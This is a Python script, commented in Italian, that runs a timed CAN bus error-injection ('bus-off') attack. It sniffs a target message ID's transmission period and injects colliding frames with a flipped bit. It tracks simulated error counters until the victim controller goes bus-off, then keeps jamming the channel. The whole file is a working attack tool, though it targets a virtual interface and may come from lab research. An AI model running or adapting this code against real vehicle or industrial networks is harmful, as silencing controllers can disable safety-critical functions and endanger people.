import can
import time
import sys
import random

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
SAMPLE_SIZE = 5
INITIAL_TEC = 0
# ----------------------

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val

def start_attacker_dynamic():
    
    try:
        # Usa 'interface' anziché 'bustype' per coerenza e futuri aggiornamenti
        bus = can.interface.Bus(channel=CAN_INTERFACE, interface='socketcan', receive_own_messages=False)
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # Variabili di stato
    victim_tec_sim = INITIAL_TEC
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0
    timestamps = []
    estimated_period = 0.0
    
    # Base temporale per la sincronizzazione
    last_attack_time = time.time()

    # --- FASE 1: STIMA DELLA FREQUENZA (Sniffing) ---
    print("\n🔍 [Attaccante] FASE 1: Stima della frequenza della Vittima...")
    
    while len(timestamps) < SAMPLE_SIZE + 1:
        msg = bus.recv(timeout=1.0) # Aspetta il messaggio per lo sniffing
        
        if msg is not None and msg.arbitration_id == TARGET_ID:
            now = time.time()
            if len(timestamps) > 0:
                print(f"   [Sniff] Rilevato ID {hex(TARGET_ID)}. Intervallo misurato: {now - timestamps[-1]:.3f}s")
            
            timestamps.append(now)

            if len(timestamps) >= 2:
                estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)
                
    if timestamps:
        last_attack_time = timestamps[-1]
    
    print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
    if estimated_period < 0.01: estimated_period = 5.0


    # --- FASE 2: ATTACCO CHIRURGICO REATTIVO ---
    print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")
    
    while True: # Loop infinito per la persistenza
        
        # 1. SINCRONIZZAZIONE (Attesa reattiva basata sull'ultima ricezione)
        next_expected_time = last_attack_time + estimated_period
        time_to_wait = next_expected_time - time.time()
        
        if time_to_wait > 0:
            time.sleep(time_to_wait - 0.005) # Aspetta fino a 5ms prima
            
        # 2. RICEZIONE/SNIFFING DEL MESSAGGIO VITTIMA
        reference_msg = bus.recv(timeout=0.01) 
        current_time = time.time()
        
        if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
            
            # **AGGIORNAMENTO CHIAVE DELLA BASE TEMPORALE**
            last_attack_time = next_expected_time 

            # 3. LOGICA TEC SIMULATA E STAMPA (Solo se la Vittima non è in Bus Off teorico)
            if victim_tec_sim < BUS_OFF_THRESHOLD:
                
                # Calcolo TEC
                if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                    victim_tec_change, adversary_tec_change = 8, 8
                    fase_desc = "Fase 1 (Active)"
                else:
                    victim_tec_change, adversary_tec_change = 7, -1 
                    fase_desc = "Fase 2 (Passive)"
                
                victim_tec_sim += victim_tec_change
                adversary_tec_sim += adversary_tec_change
                
                print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")

                if adversary_tec_sim >= BUS_OFF_THRESHOLD:
                    print("🚨🚨 [Attaccante] BUS OFF RILEVATO! Interrompo l'attacco.")
                    break
            else:
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")

            
            # 4. MANIPOLAZIONE CHIRURGICA DEI DATI
            try:
                # Copia i dati dal messaggio ricevuto (reference_msg)
                data_to_flip = bytearray(reference_msg.data)
                
                # Esegui il flip sul primo byte (indice 0)
                original_byte = data_to_flip[0]
                data_to_flip[0] = flip_first_one_from_left(original_byte)
                
                # Riconverti in lista di byte (necessario per can.Message)
                attack_data = list(data_to_flip)

                # 5. INIEZIONE DEL MESSAGGIO MALEVOLO MANIPOLATO
                msg_attack = can.Message(
                    arbitration_id=TARGET_ID,
                    data=attack_data, 
                    is_extended_id=False
                )
                bus.send(msg_attack)
                
                print(f"💣 [Attaccante] Iniettato. Dati originali: {original_byte:02X} -> Flippati: {data_to_flip[0]:02X}")
                
            except Exception as e:
                print(f"⚠️ Errore di manipolazione/invio: {e}. Inviato frame generico di blocco.")
                bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
            
            attack_counter += 1

        else:
            # 6. CASO DI FALLIMENTO (Messaggio Vittima non ricevuto)
            if victim_tec_sim >= BUS_OFF_THRESHOLD:
                # Continua la persistenza
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                attack_counter += 1
                # Aggiorniamo la base per il prossimo tentativo
                last_attack_time = next_expected_time 
            else:
                # Vittima ha jitterato: Aggiorniamo la base per il prossimo tentativo.
                last_attack_time = current_time # Reset base al tempo attuale per riprovare
                print(f"\n--- CICLO SKIPPATO ({time.strftime('%H:%M:%S')}) ---")
                
    bus.shutdown()

if __name__ == '__main__':
    start_attacker_dynamic()
